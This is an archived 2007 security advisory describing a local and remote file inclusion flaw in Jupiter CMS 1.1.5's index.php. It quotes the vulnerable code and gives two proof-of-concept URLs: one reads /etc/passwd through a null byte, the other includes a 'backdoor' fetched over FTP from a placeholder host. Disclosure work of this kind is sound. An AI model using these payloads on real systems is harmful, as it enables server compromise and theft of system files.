<html><head><title>Jupiter CMS 1.1.5 (index.php) Local/Remote File Include Vulnerability</title></head><pre>Title:          Jupiter CMS 1.1.5 Multiple Vulnerabilities
Advisory ID:    12070214
Risk level:     High
Author:         DarkFig &lt;gmdarkfig@gmail.com&gt;
URL:            http://www.acid-root.new.fr/advisories/12070214.txt

Risk level: High
Summary:    Local/Remote File Inclusion
Conditions: LFI: magic_quotes_gpc = Off
            RFI: PHP &gt;= 5.0.0, allow_url_fopen = On

The script &quot;index.php&quot; contains the following code:

if(isset($n))
{
  if(file_exists(&quot;$n.php&quot;))
  {
    if(strpos($n, &quot;../&quot;) !== false) header(&quot;location: $PHP_SELF?i=error&quot;);
    else include(&quot;$n.php&quot;);
  }
  elseif(!file_exists(&quot;$n.php&quot;)) header(&quot;location: $PHP_SELF?i=error&quot;);
}

The &quot;n&quot; parameter isn't properly filtered, this can lead to file inclusion.
Local file inclusion will work if magic_quotes_gpc=Off, the null byte char \x00
is required. Remote file inclusion will work if the server is running on PHP &gt;= 5.
In this version, the file_exists() function can be used with some URL wrappers,
you can use ftp:// for example. Simple poc:

LFI: http://&lt;host&gt;&lt;path&gt;/index.php?n=/etc/passwd%00
RFI: http://&lt;host&gt;&lt;path&gt;/index.php?n=ftp://user:password@example.com/backdoor

# milw0rm.com [2007-02-14]</pre></html>